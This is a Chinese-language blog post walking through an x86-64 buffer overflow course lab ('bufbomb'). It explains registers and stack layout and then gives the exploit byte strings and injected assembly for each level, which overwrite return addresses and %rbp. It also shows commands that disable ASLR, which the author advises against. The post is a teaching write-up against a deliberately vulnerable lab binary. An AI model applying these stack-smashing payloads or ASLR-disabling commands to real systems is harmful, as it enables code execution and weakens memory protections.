<!doctype html> <meta charset=utf-8> <title>Dear Assembly（3） - Perfect Freeze!</title> <meta name=viewport content="width=device-width,initial-scale=1"> <meta name=description content="（大概是 Lab 三部曲） Intro 引言的话我想推荐大家先去看 Ricter 菊苣的一篇文章：缓冲区溢出的 Hello World。 这篇文章的话讲的是 32 位的软娘插屁系统下的缓存区溢出，所以你看到的寄存器还是 eax、ebx等等。 今天给大家介绍的话还是主要是通过 64 位系统下的操作。毕竟寄存器数量翻了一番，位数也翻了一番，效率也更高了。最最最不同的就是汇编的代码也就是实现方式不同了。这里的话先讲一点基础知识(｢･ω･)｢。 关于寄存器 之前提到过，每个寄存器也是从 32 位升级到了 64 位。对于 64 位的寄存器 %rax，它的后 32 位就相当于原来的 %eax。 新增..."> <meta name=theme-color content=#54C7FC> <link rel=alternate href=/feed.xml type=application/atom+xml> <link rel=apple-touch-icon href=/apple-touch-icon.png> <link rel=manifest href=/manifest.json> <style>*,:after,:before{padding:0;margin:0;box-sizing:border-box}html{font-size:100%;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;text-size-adjust:none;text-rendering:optimizelegibility;image-rendering:optimizequality;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background:#fff}body{padding:0 24vw;margin:0 auto 0;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;font-size:1.6vw;line-height:1.42857143;hanging-punctuation:first allow-end;color:#000;background:#fff;transition:all .2s ease}@media (max-width:1080px){body{padding-left:8vw;padding-right:8vw;font-size:2.24vw}}@media (max-width:640px){body{padding-left:4vw;padding-right:4vw;font-size:3.84vw}}@media (max-width:400px){body{font-size:5.12vw}}a{color:#000;text-decoration:none;transition:color .5s ease,border-color .5s ease,background .5s ease,opacity 1.5s ease}a:focus,a:hover{transition:color .1s ease,border-color .1s ease,background .1s ease,opacity .1s ease;text-decoration:underline;-webkit-text-decoration-skip:ink;text-decoration-skip:ink}hr{border:0}del{text-decoration:line-through}:-ms-input-placeholder{color:#000;opacity:.2}::placeholder{color:#000;opacity:.2}:focus:-ms-input-placeholder{color:#6cb5fc}:focus::placeholder{color:#6cb5fc}.js-system--apple{font-feature-settings:"case","ss01","ss02"}.navigation{padding-top:1.4vmax;padding-bottom:1.4vmax;margin-right:-1vmax;margin-left:-1vmax;font-size:60%;font-weight:700;letter-spacing:.45em;text-transform:uppercase}.navigation li{display:inline-block;line-height:2;list-style:none}.navigation li a{padding:.5em 1vmax}.navigation li a:focus,.navigation li a:hover{color:#6cb5fc;text-decoration:none}.content{margin-bottom:16vmin}.content:after,.content:before{display:table;content:""}.content:after{clear:both}.content .post-content>:first-child{margin-top:0}.content .post-content>:first-child>:first-child{margin-top:0}.content a{font-weight:700}.content a:has(>code){-webkit-text-decoration-color:#54c7fc;text-decoration-color:#54c7fc}.content p{margin-bottom:1.6rem;line-height:1.71428571}.content header{display:flex;min-height:calc(100vh - 5.6vmax - 5ex);padding-top:10vmin;padding-bottom:10vmin;margin-bottom:16vmin;flex-direction:column;justify-content:center;background:rgba(0,0,0,.02);padding-left:24vw;padding-right:24vw;margin-left:-24vw;margin-right:-24vw}@media (max-width:1080px){.content header{min-height:calc(50vh - 1.4vmax * 2 - 3ex);padding-top:16vmin;padding-bottom:16vmin;padding-left:8vw;padding-right:8vw;margin-left:-8vw;margin-right:-8vw}}@media (max-width:640px){.content header{padding-left:4vw;padding-right:4vw;margin-left:-4vw;margin-right:-4vw}}.content header h1{font-size:360%;font-weight:700;letter-spacing:-.04em;margin-left:-2px;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none;line-height:1.1}@media (max-width:640px){.content header h1{font-size:280%}}.content header small{display:block;margin-top:2vmin}.content h3,.content h4{margin:10vmin 0 1rem;font-size:72%;font-weight:400;opacity:.5}.content ol,.content ul{margin-bottom:1.8rem;list-style:none;counter-reset:list}@media (max-width:640px){.content ol,.content ul{margin-left:1em}}.content ol li,.content ul li{line-height:1.71428571}.content ol li:before,.content ul li:before{position:absolute;display:inline-block;width:4em;margin-top:1px;margin-left:-4em;font-size:80%;line-height:2.14285714;text-align:right;opacity:.6;pointer-events:none}.content ul li:before{content:"•";padding-right:.6em}.content ol li:before{counter-increment:list;content:counter(list) ".";padding-right:.3em}.content hr::before{display:block;content:'';width:3px;height:3px;margin:2em auto;border-radius:50%;background:#000;box-shadow:24px 0 0 0 #000,-24px 0 0 0 #000}.content code{font-family:Menlo,Consolas,monospace;color:#54c7fc}.content code{font-size:92%;overflow-wrap:break-word}@media print{*,:after,:before{background:0 0!important;color:#000!important;box-shadow:none!important;text-shadow:none!important}body{padding:10mm!important;margin:0!important}a,a:visited{text-decoration:none}.content header{min-height:0;padding-bottom:0}.content .post-content{max-width:100%!important}.content .post-content a[href]:after{content:" (" attr(href) ")";font-weight:400}h3,h4,p{orphans:3;widows:3}h3{page-break-after:avoid}.navigation{display:none}}.content h3{font-size:96%;opacity:.7}.content h4{font-size:84%;opacity:.6}.navigation{text-align:center}</style> <link rel=canonical href=http://blog.cee.moe/dear-assembly-3.html> <meta property=og:type content=article> <meta property=og:site_name content="Perfect Freeze!"> <meta property=og:title content="Dear Assembly（3）"> <meta property=og:url content=http://blog.cee.moe/dear-assembly-3.html> <meta property=og:description content="（大概是 Lab 三部曲） Intro 引言的话我想推荐大家先去看 Ricter 菊苣的一篇文章：缓冲区溢出的 Hello World。 这篇文章的话讲的是 32 位的软娘插屁系统下的缓存区溢出，所以你看到的寄存器还是 eax、ebx等等。 今天给大家介绍的话还是主要是通过 64 位系统下的操作。毕竟寄存器数量翻了一番，位数也翻了一番，效率也更高了。最最最不同的就是汇编的代码也就是实现方式不同了。这里的话先讲一点基础知识(｢･ω･)｢。 关于寄存器 之前提到过，每个寄存器也是从 32 位升级到了 64 位。对于 64 位的寄存器 %rax，它的后 32 位就相当于原来的 %eax。 新增..."> <meta property=og:image content=http://blog.cee.moe/logo.png> <meta name=twitter:card content=summary_large_image> <meta name=twitter:site content=@Ceecirno> <meta name=twitter:creator content=@Ceecirno> <meta property=article:published_time content=2014-08-01T00:00:00-07:00> <meta property=article:modified_time content=2015-08-03T04:56:36-07:00> <meta name=twitter:label1 value=Words> <meta name=twitter:data1 value="918 words"> <meta name=twitter:label2 value="Reading time"> <meta name=twitter:data2 value="4 mins"> <nav class=navigation> <ul> <li> <a href=/ > Home </a> </li> <li> <a href=/articles/ > Articles </a> </li> <li> <a href=/works/ > Works </a> </li> <li> <a href=/friends/ > Friends </a> </li> <li> <a href=/about/ > About </a> </li> </ul> </nav> <main class=content role=main> <article> <header> <h1 title="Dear Assembly（3）" data-title="Dear Assembly（3）"> Dear Assembly（3）<span class="dot dot--post"> </span> </h1> <small> By <span rel=author>Cee</span> on <time datetime=2014-08-01T00:00:00-07:00>Aug 1, 2014</time> </small> </header> <div class=post-content> <p><del>（大概是 Lab 三部曲）</del></p> <hr> <h3 id=intro>Intro</h3> <p>引言的话我想推荐大家先去看 Ricter 菊苣的一篇文章：<a href=http://www.ricter.me/articles/159>缓冲区溢出的 Hello World</a>。</p> <p>这篇文章的话讲的是 32 位的软娘插屁系统下的缓存区溢出，所以你看到的寄存器还是 <code class=highlighter-rouge>eax</code>、<code class=highlighter-rouge>ebx</code>等等。</p> <p>今天给大家介绍的话还是主要是通过 64 位系统下的操作。毕竟寄存器数量翻了一番，位数也翻了一番，效率也更高了。最最最不同的就是汇编的代码也就是实现方式不同了。这里的话先讲一点基础知识(｢･ω･)｢。</p> <h4 id=关于寄存器>关于寄存器</h4> <ol> <li> <p>之前提到过，每个寄存器也是从 32 位升级到了 64 位。对于 64 位的寄存器 <code class=highlighter-rouge>%rax</code>，它的后 32 位就相当于原来的 <code class=highlighter-rouge>%eax</code>。</p> </li> <li> <p>新增了 8 个用于存放参数和临时变量的寄存器 <code class=highlighter-rouge>%r8</code> ~ <code class=highlighter-rouge>r15</code>。它们的后 32 位可用作 <code class=highlighter-rouge>%r8d</code> ~ <code class=highlighter-rouge>%r15d</code>。</p> </li> <li> <p>所有的寄存器可以按照 8/16/32/64 位读取和写入数据。</p> </li> <li> <p>增加了寄存器，减少了 <code class=highlighter-rouge>push</code>（压栈）和 <code class=highlighter-rouge>pop</code>（出栈）的次数。说明一下不同寄存器的作用：</p> </li> </ol> <ul> <li> <p><code class=highlighter-rouge>%rax</code>：保存返回值。</p> </li> <li> <p><code class=highlighter-rouge>%rdi</code>/<code class=highlighter-rouge>%rsi</code>/<code class=highlighter-rouge>%rdx</code>/<code class=highlighter-rouge>%rcx</code>/<code class=highlighter-rouge>%r8</code>/<code class=highlighter-rouge>%r9</code>：保存参数，最多可以保存 6 个参数，大于 6 个采取同 32 位的做法压栈。</p> </li> <li> <p><code class=highlighter-rouge>%r10</code>/<code class=highlighter-rouge>%r11</code>：调用函数（Caller）保存调用前环境参数。</p> </li> <li> <p><code class=highlighter-rouge>%rsp</code>：栈顶指针。</p> </li> <li> <p><code class=highlighter-rouge>%rbp</code>：基址指针。</p> </li> <li> <p><code class=highlighter-rouge>%rbx</code>：基地址。</p> </li> <li> <p><code class=highlighter-rouge>%r12</code> ~ <code class=highlighter-rouge>%r15</code>：被调用函数（Callee）的临时变量。</p> </li> </ul> <h4 id=关于内存>关于内存</h4> <ol> <li>分为运行时栈（Stack），堆（Heap），数据（Data）和指令（Text）四部分：</li> </ol> <ul> <li> <p>栈（Stack）：8MB的限制大小（IA32）。</p> </li> <li> <p>堆（Heap）：动态分配，使用<code class=highlighter-rouge>malloc</code>/<code class=highlighter-rouge>calloc</code>/<code class=highlighter-rouge>new</code>函数。</p> </li> <li> <p>数据（Data）：静态分配，部分只读，部分可读写。</p> </li> <li> <p>指令（Text）：运行时机器指令，只读。</p> </li> </ul> <ol> <li>四部分在内存中的位置由高到低。</li> </ol> <h3 id=level-0>Level 0</h3> <p>最简单的 level 了。这个 level 前一定要把调用函数的机制搞懂。</p> <p>Level 0 是希望在调用 <code class=highlighter-rouge>test()</code> 函数的时候利用内部的 <code class=highlighter-rouge>getbuf()</code> 使程序跳转到 <code class=highlighter-rouge>smoke()</code> 中继续执行。先来看看 <code class=highlighter-rouge>getbuf()</code> 函数的全貌：</p> <script src=https://gist.github.com/cee/822ecb72b74a73eaf067.js></script> <p>buffer 的长度是 36 个 char，加上压栈时的 <code class=highlighter-rouge>%rbx</code> 和 <code class=highlighter-rouge>%rbp</code>，前面一共占用 36 + 16 = 52 个 byte，最后是 8 位的 return address。所以答案就是：</p> <blockquote> <p>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 （36 char）<br> 00 00 00 00 00 00 00 00 （%rbx）<br> 00 00 00 00 00 00 00 00 （%rbp）<br> 00 00 00 00 c0 10 40 00 （Return address，call smoke）<br> （注意小端表示）</p> </blockquote> <h3 id=level-1>Level 1</h3> <p>和 Level 0 的区别仅仅在于传递参数的时候有个 <code class=highlighter-rouge>val</code> 要替换成自己的 cookie。看一下调用的代码 <code class=highlighter-rouge>fizz()</code>：</p> <script src=https://gist.github.com/cee/e5d4d5c91d87d91a058f.js></script> <p>参数共 7 个，而且 <code class=highlighter-rouge>val</code> 正好是第 7 个。预备知识里面也提到了，对于一个函数最多可以在寄存器中存放 6 个参数，也就是说 <code class=highlighter-rouge>val</code> 此时是压栈存放的。类似于 Level 0，我们也就知道了 cookie 应该保存在哪里了：</p> <blockquote> <p>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 （36 char）<br> 00 00 00 00 00 00 00 00 （%rbx）<br> 00 00 00 00 00 00 00 00 （%rbp）<br> 00 00 00 00 70 10 40 00 （Return address，call fizz）<br> 00 00 00 00 （Alignment）<br> 00 00 00 00 00 00 00 00 0b 43 71 79 17 a7 27 37 （unsigned long long）</p> </blockquote> <p>这里 Alignment 的作用是为了让 unsigned long long 确保地址是 16 字节对齐。</p> <h3 id=level-2>Level 2</h3> <p>从这关开始越来越有难度了，Level 2 是第二天睡醒起来的下午时间做的。<code class=highlighter-rouge>bang()</code> 这个函数和上面的 <code class=highlighter-rouge>fizz()</code> 很像，只不过参数变成了全局变量 <code class=highlighter-rouge>global_value</code>：</p> <script src=https://gist.github.com/cee/f9f9679be576e6e64322.js></script> <p>Hints 里面也提到了一些 tricks：</p> <blockquote> <p>Do not attempt to use either a <code class=highlighter-rouge>jmp</code> or a <code class=highlighter-rouge>call</code> instruction to jump to the code for <code class=highlighter-rouge>bang()</code>. These instructions use PC-relative addressing, which is very tricky to set up correctly. Instead, push an address on the stack and use the <code class=highlighter-rouge>retq</code> instruction.</p> </blockquote> <p>不能通过 <code class=highlighter-rouge>jmp</code> 和 <code class=highlighter-rouge>call</code> 指令跳转，因为是和 Counter 相对寻址的。我们需要找到 <code class=highlighter-rouge>bang()</code> 的入口地址并且把 <code class=highlighter-rouge>cookie</code> 复制一份到 <code class=highlighter-rouge>global_value</code> 中。继续来看 <code class=highlighter-rouge>bang()</code> 函数的汇编函数：</p> <script src=https://gist.github.com/cee/f96b2e2fd0ba6768be62.js></script> <p>找到我们需要的函数入口 <code class=highlighter-rouge>0x401020</code>，<code class=highlighter-rouge>cookie</code> 的地址 <code class=highlighter-rouge>0x602320</code>，<code class=highlighter-rouge>global_value</code> 的地址 <code class=highlighter-rouge>0x602308</code>。这时我们需要写一段汇编来实现函数的跳转：</p> <blockquote> <p>movabs 0x602320, %rax ;自己用的直接是立即数<br> movabs %rax, 0x602308<br> pushq $0x401020<br> retq</p> </blockquote> <p>生成对应的 <code class=highlighter-rouge>.d</code> 文件：</p> <blockquote> <p>gcc -c bang.s<br> objdump -d bang.o &gt; bang.d</p> </blockquote> <p>写出最后的答案：</p> <blockquote> <p>48 b8 0b 43 71 79 17 a7 27 37 48 a3 08 23 60 00 00 00 00 00 68 20 10 40 00 c3 （attack code, 26 bytes）<br> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 （26 bytes）<br> 00 00 a0 be ff ff ff 7f （%rax，where we read buffer）</p> </blockquote> <h3 id=level-3>Level 3</h3> <p>最后一关，啊哈，Instruction 上又<del>很邪恶地</del>（This style of attack is tricky）写出了要求：要更改 <code class=highlighter-rouge>%rbp</code> 和返回地址来实现攻击。最终是需要我们在 <code class=highlighter-rouge>getbuf()</code> 函数中返回我们的 <code class=highlighter-rouge>cookie</code> 来调用 <code class=highlighter-rouge>test()</code>：</p> <script src=https://gist.github.com/cee/f4cc0270a4c57aa036b3.js></script> <p>思想其实和上一题类似，也是要写一段 attack code：</p> <blockquote> <p>movabs $0x3727a7177971430b, %rax	;复制cookie<br> movabs $0x7fffffffbf00, %rbp	;更改%rbp<br> pushq $0x400ef3	;getbuf调用后的第一条指令，接着继续执行<br> retq</p> </blockquote> <p>生成后写出答案：</p> <blockquote> <p>48 b8 0b 43 71 79 17 a7 27 37 48 bd 00 bf ff ff ff 7f 00 00 68 f3 0e 40 00 c3 （attack code, 26 bytes）<br> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00（26 bytes）<br> 00 00 a0 be ff ff ff 7f （%rax，where we start comparing）<br> <strong>撒花完工，55分到手~</strong></p> </blockquote> <h3 id=why-within-gdb>Why Within Gdb</h3> <p>Instruction 在 Level 2 里面提到了这么一段话：</p> <blockquote> <p>For level 2, you will need to run your exploit within gdb for it to succeed. (the VM has special memory protection that prevents execution of memory locations in the stack. Since gdb works a little differently, it will allow the exploit to succeed.)</p> </blockquote> <p>Level 3 也同样有类似的话：</p> <blockquote> <p>For level 3, you will need to run your exploit within gdb for it to succeed.</p> </blockquote> <p>这是为什么呢？自己一开始表示很困惑，于是在 Forum 上提出了<a href="https://class.coursera.org/hwswinterface-002/forum/thread?thread_id=863">这个问题</a>，很快就有个好心的同学回答了。</p> <p>我们知道对于大多数 GNU/Linux 的发行版都有内存保护机制。其中有一种用来保护内存不被攻击的方法叫做 <strong>Address Space Layout Randomization（ASLR，位址空间配置随机加载）</strong>。位址空间配置随机加载利用随机方式配置资料位址，让某些敏感资料（例如操作系统内核）能配置到一个恶意程式未能事先得知的位址，令攻击者难于进行攻击。在系统中，ASLR 是默认开启的，而 gdb 则默认禁用了 ASLR。所以我们编译后的 <code class=highlighter-rouge>bufbomb</code> 中的地址是可以被确认的，这也就解释了为什么在 gdb 中可以改写全局变量。</p> <p>如果想要在系统下执行，可以通过 <code class=highlighter-rouge>sysctl kernel.randomize_va_space = 0</code> 或者 <code class=highlighter-rouge>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code> 来解除 ASLR，但是这里<strong>肯定不推荐</strong>这么做/w\。</p> <h3 id=references>References</h3> <ul> <li> <p>两篇在 32 位 Linux 下的解释也相当精彩：</p> <ul> <li> <p><a href=http://blog.csdn.net/u013648407/article/details/25742553>CSApp Buffer Lab</a></p> </li> <li> <p><a href=http://blog.youlingman.info/csapp-bufbomb-lab-solve/ >CSApp Bufbomb Lab解题记录</a></p> </li> </ul> </li> <li> <p>当然还有 Ricter 菊苣的：</p> <ul> <li><a href=http://www.ricter.me/articles/159>缓冲区溢出的 Hello World</a></li> </ul> </li> <li> <p>什么是 ASLR：</p> <ul> <li> <p><a href=http://en.wikipedia.org/wiki/Address_space_layout_randomization>Wikipedia</a></p> </li> <li> <p>课本《深入理解计算机系统（原作第二版）》P180</p> </li> </ul> </li> <li> <p>GNU/Linux 下的缓存区溢出：</p> <ul> <li> <p><a href=http://drops.wooyun.org/papers/1421>做个试验：简单的缓冲区溢出</a></p> </li> <li> <p><a href=http://www.exploit-db.com/papers/24085/ >Stack Smashing On A Modern Linux System</a></p> </li> </ul> </li> </ul> <hr> <p>感谢观众姥爷们翻完了这篇毫无技术的文章。两次实验给自己带来了很多知识上的长进，甚至是做出来后的惊喜，也再一次深入了解了 C/C++ 的函数调用和 x86-64 下的汇编，算是对课堂知识的一次扩充。</p> <p>如果有机会的话之后的 lab 作业也会写点总结的文章。恩就这样~</p> <footer class=post-modified-date> <p> Updated <time datetime=" 2015-08-03T04:56:36+08:00 "> Monday, Aug 03, 2015 </time> </p> </footer> </div> </article> </main> <footer class=footer> <ul> <li><a href=/ >Perfect Freeze!</a></li> <li><a href=https://github.com/Cee title=GitHub>GitHub</a></li> <li><a href=https://github.com/PerfectFreeze title="Perfect Freeze - Lab">Lab</a></li> <li><a href=/feed.xml title="Feed - Atom (The Atom Syndication Format)">Atom</a></li> </ul> <div id=disqus_thread></div> <script type=text/javascript>var disqus_shortname="perfectfreeze";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script> <noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript rel=nofollow>comments powered by Disqus.</a></noscript> </footer> <script>navigator.platform.match(/(Mac|iPhone|iPod|iPad)/i)&&document.body.classList.add("js-system--apple")</script> <script></script> <script>"serviceWorker"in navigator&&"blog.cee.moe"===window.location.hostname&&navigator.serviceWorker.register("/service-worker.js").then(function(e){console.log("ServiceWorker registration successful with scope: ",e.scope)}).catch(function(e){console.log("ServiceWorker registration failed: ",e)})</script> <script>!function(e,a,t,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,o=a.createElement(t),s=a.getElementsByTagName(t)[0],o.async=1,o.src="//www.google-analytics.com/analytics.js",s.parentNode.insertBefore(o,s)}(window,document,"script",0,"ga"),ga("create","UA-48656879-8","auto"),ga("send","pageview")</script>